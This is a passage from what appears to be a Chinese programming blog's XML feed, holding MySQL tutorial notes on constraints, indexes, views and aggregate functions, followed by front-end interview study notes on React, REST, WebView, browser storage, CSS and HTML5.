(P_Id) ); 如需命名 UNIQUE 约束，并定义多个列的 UNIQUE 约束，使用下面的 SQL 语法： CREATE TABLE Persons ( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), CONSTRAINT uc_PersonID UNIQUE (P_Id,LastName) ); 当表已被创建时，如需在 “P_Id“ 列创建 UNIQUE 约束，使用下面的 SQL： ALTER TABLE Persons ADD UNIQUE (P_Id); 如需命名 UNIQUE 约束，并定义多个列的 UNIQUE 约束，使用下面的 SQL 语法： ALTER TABLE Persons ADD CONSTRAINT uc_PersonID UNIQUE (P_Id,LastName); 撤销 UNIQUE 约束: ALTER TABLE Persons DROP INDEX uc_PersonID (3) PRIMARY KEY 约束唯一标识数据库表中的每条记录。主键必须包含唯一的值，主键列不能包含 NULL 值。每个表都应该有一个主键，并且每个表只能有一个主键。下面的 SQL 在 “Persons” 表创建时在 “P_Id“ 列上创建 PRIMARY KEY 约束： CREATE TABLE Persons ( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), PRIMARY KEY (P_Id) ); 如需命名 PRIMARY KEY 约束，并定义多个列的 PRIMARY KEY 约束，使用下面的 SQL 语法： CREATE TABLE Persons ( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), CONSTRAINT pk_PersonID PRIMARY KEY (P_Id,LastName) ); 注释：在上面的实例中，只有一个主键 PRIMARY KEY（pk_PersonID）。然而，pk_PersonID 的值是由两个列（P_Id 和 LastName）组成的。当表已被创建时，如需在 “P_Id“ 列创建 PRIMARY KEY 约束，使用下面的 SQL： ALTER TABLE Persons ADD PRIMARY KEY (P_Id); 如需命名 PRIMARY KEY 约束，并定义多个列的 PRIMARY KEY 约束，使用下面的 SQL 语法： ALTER TABLE Persons ADD CONSTRAINT pk_PersonID PRIMARY KEY (P_Id,LastName); 撤销 PRIMARY KEY 约束: ALTER TABLE Persons DROP PRIMARY KEY 撤销PRIMARY KEY约束时，不论约束条件为一列还是多列，对于MySQL，撤销都是如上的语句。(4) FOREIGN KEY 约束一个表中的 FOREIGN KEY 指向另一个表中的 PRIMARY KEY。FOREIGN KEY 约束用于预防破坏表之间连接的行为。FOREIGN KEY 约束也能防止非法数据插入外键列，因为它必须是它指向的那个表中的值之一。参考菜鸟教程。(5) CHECK 约束用于限制列中的值的范围。如果对单个列定义 CHECK 约束，那么该列只允许特定的值。如果对一个表定义 CHECK 约束，那么此约束会基于行中其他列的值在特定的列中对值进行限制。参考菜鸟教程。(6) DEFAULT 约束用于向列中插入默认值。如果没有规定其他的值，那么会将默认值添加到所有的新记录。下面的 SQL 在 “Persons” 表创建时在 “City” 列上创建 DEFAULT 约束： CREATE TABLE Persons ( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255) DEFAULT &apos;Sandnes&apos; ); 通过使用类似 GETDATE() 这样的函数，DEFAULT 约束也可以用于插入系统值： CREATE TABLE Orders ( O_Id int NOT NULL, OrderNo int NOT NULL, P_Id int, OrderDate date DEFAULT GETDATE() ); 当表已被创建时，如需在 “City” 列创建 DEFAULT 约束，使用下面的 SQL: ALTER TABLE Persons ALTER City SET DEFAULT &apos;SANDNES&apos;; 撤销 DEFAULT 约束: ALTER TABLE Persons ALTER City DROP DEFAULT; 28.CREATE INDEX用于在表中创建索引。在不读取整个表的情况下，索引使数据库应用程序可以更快地查找数据。用户无法看到索引，它们只能被用来加速搜索/查询。注释：更新一个包含索引的表需要比更新一个没有索引的表花费更多的时间，这是由于索引本身也需要更新。因此，理想的做法是仅仅在常常被搜索的列（以及表）上面创建索引。在表上创建一个简单的索引。允许使用重复的值： CREATE INDEX index_name ON table_name (column_name1, column_name2); 在表上创建一个唯一的索引。不允许使用重复的值(唯一的索引意味着两个行不能拥有相同的索引值)： CREATE UNIQUE INDEX index_name ON table_name (column_name); 29.DROP使用 DROP 语句，可以轻松地删除索引、表和数据库。DROP INDEX 语句用于删除表中的索引。MySQL 的 DROP INDEX 语法：ALTER TABLE table_name DROP INDEX index_name; DROP TABLE 语句用于删除表: DROP TABLE table_name; DROP DATABASE 语句用于删除数据库: DROP DATABASE database_name; 仅仅删除表内的数据，但并不删除表本身时： TRUNCATE TABLE table_name; 30.ALTERALTER TABLE 语句用于在已有的表中添加、删除或修改列。在表中添加列: ALTER TABLE table_name ADD column_name datatype; 删除表中的列: ALTER TABLE table_name DROP COLUMN column_name; 改变表中列的数据类型: ALTER TABLE table_name MODIFY COLUMN column_name datatype; 31.AUTO INCREMENTAUTO_INCREMENT 会在新记录插入表中时生成一个唯一的数字。可用于在每次插入新记录时，自动地创建主键字段的值。下面的 SQL 语句把 “Persons” 表中的 “ID” 列定义为 AUTO_INCREMENT 主键字段： CREATE TABLE Persons ( ID int NOT NULL AUTO_INCREMENT, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), PRIMARY KEY (ID) ); 默认地，AUTO_INCREMENT 的开始值是 1，每条新记录递增 1。要让 AUTO_INCREMENT 序列以其他的值起始，请使用下面的 SQL 语法： ALTER TABLE Persons AUTO_INCREMENT=100;要在 “Persons” 表中插入新记录，我们不必为 “ID” 列规定值（会自动添加一个唯一的值）： INSERT INTO Persons (FirstName,LastName) VALUES (&apos;Lars&apos;,&apos;Monsen&apos;); 32.视图（Views）视图是基于 SQL 语句的结果集的可视化的表。视图包含行和列，就像一个真实的表。视图中的字段就是来自一个或多个数据库中的真实的表中的字段。可以向视图添加 SQL 函数、WHERE 以及 JOIN 语句，也可以呈现数据，就像这些数据来自于某个单一的表一样。CREATE VIEW 语法: CREATE VIEW view_name AS SELECT column_name(s) FROM table_name WHERE condition; 注释：视图总是显示最新的数据！每当用户查询视图时，数据库引擎通过使用视图的 SQL 语句重建数据。 33.日期（Dates）确保所插入的日期的格式，与数据库中日期列的格式相匹配。MySQL Date 函数。 34.NULL 值如果表中的某个列是可选的，那么我们可以在不向该列添加值的情况下插入新记录或更新已有的记录。这意味着该字段将以 NULL 值保存。NULL 值的处理方式与其他值不同。NULL 用作未知的或不适用的值的占位符。无法使用比较运算符来测试 NULL 值，比如=、&lt; 或 &lt;&gt;。必须使用 IS NULL 和 IS NOT NULL 操作符。 SELECT LastName,FirstName,Address FROM Persons WHERE Address IS NULL; 35.NULL 函数可以使用 IFNULL() 函数 SELECT ProductName,UnitPrice*(UnitsInStock+IFNULL(UnitsOnOrder,0)) FROM Products; 或者： SELECT ProductName,UnitPrice*(UnitsInStock+COALESCE(UnitsOnOrder,0)) FROM Products; 示例： //如果alexa列为null值，则赋予0，否则，取原值 select id,name,url,ifnull(alexa,0)from websites; select id,name,url,COALESCE(alexa,0) from websites; 36.数据类型数据类型定义列中存放的值的种类。SQL 通用数据类型。 37.SQL 函数(1) SQL Aggregate 函数SQL Aggregate 函数计算从列中取得的值，返回一个单一的值。常用的如下： AVG() - 返回平均值 SELECT AVG(column_name) FROM table_name; COUNT() - 返回行数 SELECT COUNT(column_name) FROM table_name; FIRST() - 返回第一个记录的值 //只有 MS Access 支持 FIRST() 函数。 MySQL语法实现此函数如：SELECT name AS FirstSite FROM Websites LIMIT 1; LAST() - 返回最后一个记录的值 //只有 MS Access 支持 LAST() 函数。 MAX() - 返回最大值 SELECT MAX(column_name) FROM table_name; MIN() - 返回最小值 SUM() - 返回总和 (2) SQL Scalar 函数SQL Scalar 函数基于输入值，返回一个单一的值。常用的如下： UCASE() - 将某个字段转换为大写 SELECT UCASE(column_name) FROM table_name; LCASE() - 将某个字段转换为小写 MID() - 从某个文本字段提取字符，MySql 中使用 SELECT MID(column_name,start[,length]) FROM table_name; SubString(字段，1，end) - 从某个文本字段提取字符 LEN() - 返回某个文本字段的长度 //MySQL中使用方法： SELECT LENGTH(column_name) FROM table_name; ROUND() - 对某个数值字段进行指定小数位数的四舍五入 SELECT ROUND(column_name,decimals) FROM table_name; NOW() - 返回当前的系统日期和时间 SELECT NOW() FROM table_name; FORMAT() - 格式化某个字段的显示方式 SELECT FORMAT(column_name,format) FROM table_name; (3) GROUP BY 语句用于结合聚合函数，根据一个或多个列对结果集进行分组。 SELECT column_name, aggregate_function(column_name) FROM table_name WHERE column_name operator value GROUP BY column_name; 如下统计 access_log 各个 site_id 的访问量： mysql&gt; SELECT site_id,SUM(access_log.count) -&gt; FROM access_log -&gt; GROUP BY site_id; +---------+-----------------------+ | site_id | SUM(access_log.count) | +---------+-----------------------+ | 1 | 275 | | 2 | 10 | | 3 | 521 | | 4 | 13 | | 5 | 750 | +---------+-----------------------+ GROUP BY 多表连接时，以下语句统计所有网站的访问的记录数： mysql&gt; SELECT Websites.name,COUNT(access_log.aid) AS nums FROM access_log -&gt; LEFT JOIN Websites -&gt; ON access_log.site_id=Websites.id -&gt; GROUP BY Websites.name; +--------------+------+ | name | nums | +--------------+------+ | Facebook | 2 | | Google | 2 | | 微博 | 1 | | 淘宝 | 1 | | 菜鸟教程 | 3 | +--------------+------+ 以上示例中，access_log作为左表，Websites作为右表，通过 GROUP BY 对 COUNT得到的结果按site_id分组。 (4) HAVING 子句增加 HAVING 子句原因是，WHERE 关键字无法与聚合函数一起使用。HAVING 子句可以让我们筛选分组后的各组数据。语法如下： SELECT column_name, aggregate_function(column_name) FROM table_name WHERE column_name operator value GROUP BY column_name HAVING aggregate_function(column_name) operator value; 以下语句用于查找总访问量大于 200 的网站： mysql&gt; SELECT Websites.name,Websites.url,SUM(access_log.count) AS nums FROM access_log -&gt; INNER JOIN Websites -&gt; ON access_log.site_id=Websites.id -&gt; GROUP BY Websites.name -&gt; HAVING SUM(access_log.count) &gt; 200; +--------------+--------------------------+------+ | name | url | nums | +--------------+--------------------------+------+ | Facebook | http://www.facebook.com/ | 750 | | Google | https://www.google.com/ | 275 | | 菜鸟教程 | http://www.runoob.com | 521 | +--------------+--------------------------+------+ 以下语句用于查找总访问量大于 200 的网站，并且 alexa 排名小于 200： mysql&gt; SELECT Websites.name,Websites.alexa,SUM(access_log.count) AS nums FROM access_log -&gt; INNER JOIN Websites -&gt; ON Websites.id=access_log.site_id -&gt; WHERE Websites.alexa &lt; 200 -&gt; GROUP BY Websites.name -&gt; HAVING SUM(access_log.count) &gt; 200; +----------+-------+------+ | name | alexa | nums | +----------+-------+------+ | Facebook | 3 | 750 | | Google | 1 | 275 | +----------+-------+------+ 具体的使用方法参见菜鸟教程SQL 函数。]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【interview questions about Web】]]></title>
    <url>%2F2018%2F03%2F04%2Finterview-questions-about-Web%2F</url>
    <content type="text"><![CDATA[Web方面的知识盲区补漏。 匹配URL的正则表达式URL由三部分组成：资源类型(协议)、存放资源的主机域名、资源文件名。URL的一般语法格式为(带方括号[ ]的为可选项)：protocol :// hostname[:port] / path / [;parameters][?query]#fragment据说比较好用匹配较全面的是这个：(https?|ftp|file)://[-A-Za-z0-9+&amp;@#/%?=~_|!:,.;]+[-A-Za-z0-9+&amp;@#/%=~_|]参考自博客正确匹配URL的正则表达式、匹配URL的正则表达式解析。 React虚拟DOM的优势，为什么虚拟DOM操作比原生方式快将数据的变化实时反映到UI上，这时需要对DOM进行操作，但复杂或频繁的DOM操作(会造成重排、重绘)通常是性能瓶颈产生的原因，为此，React引入了虚拟DOM（Virtual DOM）的机制。 虚拟DOM? 在React中，render执行的结果得到的并不是真正的DOM节点，结果仅仅是轻量级的JavaScript对象，称之为virtual DOM。(是不是跟文档片段有异曲同工之妙？dom中的文档碎片) 虚拟DOM是React的一大亮点，具有batching(批处理)和高效的Diff算法 (深入浅出React（四）：虚拟DOM Diff算法解析)。这让我们可以无需担心性能问题而”毫无顾忌”的随时“刷新”整个页面，由虚拟 DOM来确保只对界面上真正变化的部分进行实际的DOM操作。 虚拟DOM对比原生操作DOM原生操作DOM方式，使用 innerHTML。在一个大型列表所有数据都变了的情况下，还算是合理，但当只有一行数据发生变化时，它也需要重置整个 innerHTML，这时候显然就造成了大量浪费。innerHTML: render html string + 重新创建所有 DOM 元素Virtual DOM: render Virtual DOM + diff + 必要的 DOM 更新和 DOM 操作比起来，js 计算是非常便宜的。Virtual DOM render + diff 显然比渲染 html 字符串要慢，但是，它依然是纯 js 层面的计算，比起后面的 DOM 操作来说，依然便宜了太多。 存疑React虚拟DOM的工作机制还不太理解，深入学习以后需要再回顾。React虚拟DOM浅析React 的 diff 算法为什么 React 的 virtual DOM 比原生的DOM 渲染性能更好？ RESTfulREST(Representational State Transfer)，“表述性状态转移”，是一种网络应用架构规范，目标是构建可扩展的web service。REST规范可以提高架构的性能和可维护性。REST是一种更简单的SOAP协议及以WSDL为基础的web service的替代。(SOAP暴露接口，REST暴露资源)参考博客WebService两种发布协议–SOAP和REST的区别。RESTful（采用REST架构规范的）系统通常是通过HTTP协议，并且使用HTTP的GET,POST,PUT,DELETE等动词来收发数据。W3C TAG开发了REST架构，基于HTTP 1.0。万维网代表了最大的REST架构实现，你可以认为所有的网页服务器都是采用REST架构的RESTful系统。目前在三种主流的Web服务实现方案中，因为REST模式的Web服务与复杂的SOAP和XML-RPC对比来讲明显的更加简洁，越来越多的web服务开始采用REST风格设计和实现。常见的三种Web服务架构。 WebView相关先了解什么是Hybrid APP。所谓Hybrid,即混合开发,意味着半原生半Web,其实在H5兴盛之前,Hybrid模式就已经比较成熟了,但是一直不愠不火(因为系统的一些现在以及html本身功能的限制)。怎么样的开发模式才算是Hybrid模式呢： Hybrid是半Native半web开发模式Hybrid模式中,底层功能API均由原生容器通过某种方式提供,然后业务逻辑由H5页面完成,最终原生容器加载H5页面,完成整个App 成熟的Hybrid模式意味着业务逻辑均由H5实现一款成熟的Hybrid框架,意味着各种类型的api都很完善,那么这时候几乎所有与业务相关的逻辑都是放在H5页面中的,原生只作为容器存在 成熟的Hybrid模式可复用性非常高,可以跨平台开发成熟的Hybrid框架,那么原生只会提供底层API,也就是说所有的业务是H5完成,不管是什么项目,业务只由H5实现,这时候就可以发现,业务代码是可以跨平台的,也就是说,开发一次,就可以和各自原生容器结合,组成两种原生安装包了,达到了跨平台开发效果 APP三种开发模式–之–HybridApp解决方案 原生APP开发中有一个webview的组件(Android中是webview,iOS7以下有UIWebview,7以上有WKWebview),这个组件可以加载Html文件。在Html5没有兴盛之前,加载的Html往往只能用来做一些简单的静态资源显示,但是H5大行其道以后,Html5中有很多新增的功能,炫酷的效果,特别是iOS中H5支持一直都很良好,Android 4.4以上支持也足够,所以这时候发现可以将一些主要的逻辑都用H5页面来编写,然后原生直接用webview加载显示,这样大大提高了开发效率,而且体验也很不错。webview用来展示网页的view组件，该组件是你运行自己的浏览器或者在你的线程中展示线上内容的基础。使用webkit渲染引擎来展示，并且支持前进后退等基于浏览历史，放大缩小，等更多功能。简单来说WebView是手机中内置了一款高性能 webkit 内核浏览器,在 SDK 中封装的一个组件。不给过没有提供地址栏和导航栏，只是单纯的展示一个网页界面。参考文章前端解读Webview、WebView JavascriptBridge机制解析、JS交互与WebView的工作原理浅析。 软件开发模式之“快速迭代”开发几种常见的软件开发模式对比参考博客软件开发模式对比(瀑布、迭代、螺旋、敏捷)。迭代成本比较低，一般采用敏捷开发的模式，产品快速的推动上线，上线后会通过用户反馈和用户行为分析不断的进行产品改进，并且每次改进的周期比较短，如果把“快速迭代”理解为快速并持续的更新和改进产品。 敏捷开发-快速迭代 线程和进程的区别线程和进程的区别是什么？–知乎进程和线程都是一个时间段的描述，是CPU工作时间段的描述，不过是颗粒大小不同。进程就是包换上下文切换的程序执行时间总和 = CPU加载上下文+CPU执行+CPU保存上下文。线程是共享了进程的上下文环境的更为细小的CPU时间段。进程和线程的区别进程与线程的一个简单解释–阮一峰 浅谈js运行机制(线程）js运作在浏览器中,是单线程的，即js代码始终在一个线程上执行，这个线程称为js引擎线程。浏览器是多线程的，除了js引擎线程，它还有： UI渲染线程 浏览器事件触发线程 http请求线程 EventLoop轮询的处理线程 .... 单线程的含义是js只能在一个线程上运行，也就说，js同时只能执行一个js任务，其它的任务则会排队等待执行。js是单线程的,并不代表js引擎线程只有一个。js引擎有多个线程，一个主线程，其它的后台配合主线程。多线程之间会共享运行资源，浏览器端的js会操作dom，多个线程必然会带来同步的问题，所有js核心选择了单线程来避免处理这个麻烦。js可以操作dom，影响渲染，所以js引擎线程和UI线程是互斥的。这也就解释了js执行时会阻塞页面的渲染。 JavaScript 运行机制详解：再谈Event Loop–阮一峰Javascript异步编程的4种方法–阮一峰关于javascript的单线程和异步的一些问题Node.js的线程和进程 图片加载完成之前获取图片高度JS快速获取图片宽高的方法 参考自博客图片加载完成之前获取图片高度。 原理：利用的就是浏览器加载图片时的一个策略：当图片头部信息加载完成后，浏览器即获知了图片的大小，然后就会在页面上空出相应的区域来，然后再下载图片的剩余数据并且显示到之前空出的区域中。所以我们要做的就是不断的去问浏览器你得到高度信息了没有，问到之后就可以马上做相应的处理，而此时图片还没有下载完成。 补充：js图片img的onload事件与complete属性之间的关系,onload是图片加载完成执行的事件，complete属性是图片显示出来以后为true，那么在onload之前complete肯定是false的，那么我们就可以在onload事件内部判断complete属性是否为true。如果为true那么代表图片真正的加载成功，否则可以重新加载。 img加载完成就会触发onload事件，src是异步加载图片的，如果在绑定事件前就已经加载完成，onload事件不会触发。img.complete是一直都有的属性，加载完成后为true。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576var imgReady = (function () &#123; var list = [], intervalId = null, // 用来执行队列 tick = function () &#123; var i = 0; for (; i &lt; list.length; i++) &#123; list[i].end ? list.splice(i--, 1) : list[i](); &#125;; !list.length &amp;&amp; stop(); &#125;, // 停止所有定时器队列 stop = function () &#123; clearInterval(intervalId); intervalId = null; &#125;; return function (url, ready, load, error) &#123; var onready, width, height, newWidth, newHeight, img = new Image(); img.src = url; // 如果图片被缓存，则直接返回缓存数据 if (img.complete) &#123; ready.call(img); load &amp;&amp; load.call(img); return; &#125;; width = img.width; height = img.height; // 加载错误后的事件 img.onerror = function () &#123; error &amp;&amp; error.call(img); onready.end = true; img = img.onload = img.onerror = null; &#125;; // 图片尺寸就绪 onready = function () &#123; newWidth = img.width; newHeight = img.height; if (newWidth !== width || newHeight !== height || // 如果图片已经在其他地方加载可使用面积检测 newWidth * newHeight &gt; 1024 ) &#123; ready.call(img); onready.end = true; &#125;; &#125;; onready(); // 完全加载完毕的事件 img.onload = function () &#123; // onload在定时器时间差范围内可能比onready快 // 这里进行检查并保证onready优先执行 !onready.end &amp;&amp; onready(); load &amp;&amp; load.call(img); // IE gif动画会循环执行onload，置空onload即可 img = img.onload = img.onerror = null; &#125;; // 加入队列中定期执行 if (!onready.end) &#123; list.push(onready); // 无论何时只允许出现一个定时器，减少浏览器性能损耗 if (intervalId === null) intervalId = setInterval(tick, 40); &#125;; &#125;; &#125;)(); 代码取自腾讯图片详情页。这种做法仅适用于 img 元素的 src 属性是一个 URL 的情况，如果是 Data URI 则不能这么做，因为浏览器是另外一套处理逻辑了。 图片预加载与懒加载基于用户行为的图片等资源预加载–张鑫旭 预加载和懒加载的区别，懒加载当用户触发到某块内容区后才去加载，预加载是用户行为还没发生，资源已经加载完毕。 实现图片预加载的三大方法]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【interview questions about JS】 from牛客网]]></title>
    <url>%2F2018%2F02%2F27%2Finterview-questions-about-JS%2F</url>
    <content type="text"><![CDATA[来自牛客网前端面试经典题目合集 篇学习总结。 Cookie的弊端cookie虽然在持久保存客户端数据提供了方便，分担了服务器存储的负担，但还是有很多局限性的。优点：1) 数据持久性。2) 不需要任何服务器资源。 Cookie 存储在客户端并在发送后由服务器读取。3) 可配置到期规则。 控制 cookie 的生命期，使之不会永远有效。偷盗者很可能拿到一个过期的 cookie 。4) 简单性。 基于文本的轻量结构。5) 通过良好的编程，控制保存在 cookie 中的 session 对象的大小。6) 通过加密和安全传输技术（ SSL ），减少 cookie 被破解的可能性。7) 只在 cookie 中存放不敏感数据，即使被盗也不会有重大损失。缺点：1) Cookie 数量和长度的限制 。数量：每个域的 cookie 总数有限。 a) IE6 或更低版本最多 20 个 cookie b) IE7 和之后的版本最后可以有 50 个 cookie c) Firefox 最多 50 个 cookie d) chrome 和 Safari 没有做硬性限制 长度：每个 cookie 长度不超过 4KB （ 4096B ），否则会被截掉。2) 潜在的安全风险。 Cookie 可能被拦截、篡改。如果 cookie 被拦截，就有可能暴露所有的 session 信息。3)额外开销。 cookie 在每次发起 HTTP 请求的时候都会被发送给服务器，一些不需要的信息也有可能会被发送，会增加开销。4) 用户配置为禁用 。有些用户禁用了浏览器或客户端设备接受 cookie 的能力，因此限制了这一功能。5) 有些状态不可能保存在客户端 。例如，为了防止重复提交表单，我们需要在服务器端保存一个计数器。如果我们把这个计数器保存在客户端，那么它起不到任何作用。 浏览器本地存储1)Cookie ：广泛应用，局限明显。支持数据存储量相对较少，每个 domain 最多只能有 20 条 cookie ，每个 cookie 长度不能超过 4KB ，否则会被截掉；同时，存在安全性问题，如果被拦截，就可以取得所有的 session 信息。2)Flash SharedObject ：使用的是 kissy 的 store 模块来调用 Flash SharedObject 。优点：容量适中，基本上不存在兼容性问题缺点：要在页面中引入特定的 Flash 和 JS ，增加额外负担，处理繁琐；还是有部分机子没有 flash 运行环境。3)Google Gears ： Google 的离线方案，已经停止更新，官方推荐使用 HTML5 的 localStorage 方案。4)User Data ： 是微软为 IE 专门在系统中开辟的一块存储空间，只支持 Windows+IE 的组合。单个文件的大小限制是 128KB ，一个域名下总共可以保存 1024KB 的文件，文件个数应该没有限制。在受限站点里这两个值分别是 64KB 和 640KB 。（所以如果考虑到各种情况的话，单个文件最好能控制 64KB 以下。）（实际测试 2000(IE5.5)、 XP(IE6 、 IE7)， Vista(IE7)下都是可正常使用。）5)indexedDB : indexedDB是适合在本地存储大量非关系型数据（NOSQL），采取的是事件+异步回调进行操作。6)Web Storage在较高版本的浏览器中， JS 提供了 sessionStorage 和 globalStorage 。在 HTML5 中提供了 sessionStorage 和 localStorage 。sessionStorage 用于本地存储一个会话（ session ）中的数据，这些数据只有在同一个会话中的页面才能访问，会话结束后数据随之销毁。因此 sessionStorage 不是一种持久化的本地存储，仅仅是会话级别的存储。globalStorage 跨越会话存储数据。有特定访问限制，要指定哪些域可访问该数据。 localStorage 用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。不能给 localStorage 指定任何规则，要访问同一个 localStorage ，页面必须使用同一个域名，使用同一种协议，在同一个端口上，即要求同源，不能跨域。 优点：容量大、易用、强大、原生支持缺点： a) 兼容性差（ Chrome,Safari,Firefox,Opera,IE8+ 支持 ， IE8 以下版本不支持）b) 安全性差（所以请勿使用 localStorage 保存敏感信息）c)跨域限制用途：localStorage 可以利用持久化数据本地存储的特点来做网站优化，把一些静态资源，存储在本地，但是这个意义对PC端可能相对小一些，PC端的网速一般比较理想，读取本地localStorage的消耗 和读取服务器的消耗优化不了多少，而且存在本地localstorage的维护成本，总体性价比一般，移动端是可以利用这一点做一些优化，移动端的网络环境还是没达到理想，所以读取localstorage的代价应该小于服务器加载。 Web Storage 与 Cookie 的区别1 、 Web Storage 中的数据仅在存在本地，不与服务器发生交互。Cookie 中的数据会在浏览器和服务器中来回传递。2 、 Web Storage 存储空间更大，可以达到 5M。Cookie 数据大小不超过 4KB 。3 、 Web Storage 提供更多丰富易用的接口，如 setItem ， getItem ， removeItem ， clear 等方法，操作数据更方便。Cookie 需要自己封装方法。4 、 cookie 需要指定作用域，不可以跨域调用，同样Web Storage 也存在跨域问题。5、 cookie 中的数据在过期时间之前均有效， Web Storage 则不同， sessionStorage 中的数据在当前浏览器窗口关闭后自动删除， localStorage持久存储数据，除非主动删除数据。 注： 但 Cookie 是不可以或缺的，Cookie 的作用是与服务器进行交互，作为 HTTP 规范的一部分而存在 ，而 Web Storage 仅仅是为了在本地 “ 存储 ” 数据而生。 position的absolute与fixed共同点与不同点共同点：1.改变行内元素的呈现方式，display被置为inline-block；2.让元素脱离普通流，不占据空间；3.默认会覆盖到非定位元素上 不同点：absolute的“根元素”是可以设置的，在父元素上设定定位relative；而fixed的“根元素”固定为浏览器窗口。当滚动网页，fixed元素与浏览器窗口之间的距离是不变的。 CSS 哪些属性可以继承? CSS3新增伪类?可继承的样式：1.font-size2.font-family3.color4.text-indent不可继承的样式：1.border2.padding3.margin4.width5.heightCSS3新增伪类举例： p:first-of-type 选择属于其父元素的首个 &lt;p&gt; 元素的每个 &lt;p&gt; 元素。 p:last-of-type 选择属于其父元素的最后 &lt;p&gt; 元素的每个 &lt;p&gt; 元素。 p:only-of-type 选择属于其父元素唯一的 &lt;p&gt; 元素的每个 &lt;p&gt; 元素。 p:only-child 选择属于其父元素的唯一子元素的每个 &lt;p&gt; 元素。 p:nth-child(2) 选择属于其父元素的第二个子元素的每个 &lt;p&gt; 元素。 :enabled :disabled 控制表单控件的禁用状态。 :checked 单选框或复选框被选中。 CSS3的新特性答题套路：在我们的项目中经常用CSS3中的XX属性来实现XX特效。 CSS3实现圆角（border-radius），阴影（box-shadow） 对文字加特效（text-shadow、），线性渐变（gradient） transform变换: rotate(9deg); scale(0.85,0.90); translate(0px,-30px); skew(-9deg,0deg) // 旋转,缩放,定位,倾斜 动画animation 增加了更多的CSS选择器 多背景 rgba() 在CSS3中唯一引入的伪类是 ::selection. 媒体查询，多栏布局 border-image CSS sprites 的理解及使用CSS Sprites 其实就是把网页中一些背景图片整合到一张图片文件中，再利用 CSS 的”background-image”，”background-repeat”，”background-position” 的组合进行背景定位，background-position 可以用数字能精确的定位出背景图片的位置。这样可以减少很多图片请求的开销，因为请求耗时比较长；请求虽然可以并发，但是也有限制，一般浏览器都是6个。对于未来而言，就不需要这样做了，因为有了 http2。 HTTP/1.x 有个问题叫线端阻塞(head-of-line blocking), 它是指一个连接(connection)一次只提交一个请求的效率比较高, 多了就会变慢。 HTTP/1.1 试过用流水线(pipelining)来解决这个问题, 但是效果并不理想(数据量较大或者速度较慢的响应, 会阻碍排在他后面的请求). 此外, 由于网络媒介(intermediary )和服务器不能很好的支持流水线, 导致部署起来困难重重。而多路传输(Multiplexing)能很好的解决这些问题, 因为它能同时处理多个消息的请求和响应; 甚至可以在传输过程中将一个消息跟另外一个掺杂在一起。 所以客户端只需要一个连接就能加载一个页面。参见博客HTTP1.0、HTTP1.1和HTTP2.0的区别。 Doctype文档类型 该标签可声明三种 DTD 类型，分别表示严格版本、过渡版本以及基于框架的 HTML 文档。 HTML 4.01 规定了三种文档类型：Strict、Transitional 以及 Frameset。 XHTML 1.0 规定了三种 XML 文档类型：Strict、Transitional 以及 Frameset。 Standards （标准）模式（也就是严格呈现模式）用于呈现遵循最新标准的网页，而 Quirks（包容）模式（也就是松散呈现模式或者兼容模式）用于呈现为传统浏览器而设计的网页。 HTML与XHTML之间的区别1、XHTML 元素必须被正确地嵌套，不正确嵌套会报错。错误：&lt;p&gt;&lt;span&gt;this is example.&lt;/p&gt;&lt;/span&gt;正确：&lt;p&gt;&lt;span&gt;this is example.&lt;/span&gt;&lt;/p&gt;而html不被正确嵌套也不会报错。2、 XHTML 元素必须被关闭，即使是空标签&lt;/br&gt;，否则报错。而html可以写成&lt;br&gt;而不报错。3、 XHTML 标签名必须用小写字母。html可以大写。4、 XHTML 文档必须拥有根元素html，所有的 XHTML 元素必须被嵌套于 根元素中。而html不是必须的。 DOM操作——怎样添加、移除、移动、复制、创建和查找节点1、 创建新节点 createDocumentFragment() // 创建一个DOM片段 createElement() // 创建一个具体的元素 createTextNode() // 创建一个文本节点 2、 添加、移除、替换、插入 appendChild() removeChild() replaceChild() insertBefore() // 在已有的子节点前插入一个新的子节点 3、查找 getElementsByTagName() // 通过标签名称 getElementsByName() // 通过元素的Name属性的值(IE容错能力较强，会得到一个数组，其中包括id等于name值的) document.getElementById() // 通过元素Id，唯一性 getElementsByClassName() //通过类名 queryselector() querySeletorAll() // (IE67 不支持) html5 的新特性以及新标签的浏览器兼容问题新特性：HTML5 现在已经不是 SGML 的子集，主要是关于图像，位置，存储，多任务等功能的增加。1、拖拽释放(Drag and drop) API2、语义化更好的内容标签（header,nav,footer,aside,article,section）3、 音频、视频API(audio,video)4、 画布(Canvas) API5、 地理(Geolocation) API6、 本地离线存储 localStorage 长期存储数据，浏览器关闭后数据不丢失；7、 sessionStorage 的数据在浏览器关闭后自动删除8、 表单控件，calendar、date、time、email、url、search9、 新的技术webworker, websocket, Geolocation移除的元素：1、 纯表现的元素：basefont，big，center，font, s，strike，tt，u；2、 对可用性产生负面影响的元素：frame，frameset，noframes；支持HTML5新标签： IE8/IE7/IE6支持通过 document.createElement 方法产生的标签，可以利用这一特性让这些浏览器支持 HTML5 新标签，浏览器支持新标签后，还需要添加标签默认的样式（当然最好的方式是直接使用成熟的框架、使用最多的是html5shiv框架）： &lt;!--[if lt IE 9]&gt; &lt;script&gt; src=&quot;http://html5shiv.googlecode.com/svn/trunk/html5.js&quot;&lt;/script&gt; &lt;![endif]--&gt; 如何区分：DOCTYPE声明新增的结构元素、功能元素 iframe的优缺点优点：1、 解决加载缓慢的第三方内容如图标和广告等的加载问题2、 Security sandbox3、 并行加载脚本4、 重载页面时不需要重载整个页面，只需要重载页面中的一个框架页(减少了数据的传输，增加了网页下载速度)5、 方便制作导航栏缺点：1、 iframe会阻塞主页面的Onload事件2、 即时内容为空，加载也需要时间3、 没有语意4、 会产生很多页面，不容易管理5、 不容易打印6、 浏览器的后退按钮无效7、 代码复杂,无法被一些搜索引擎索引到8、 多数小型的移动设备（PDA 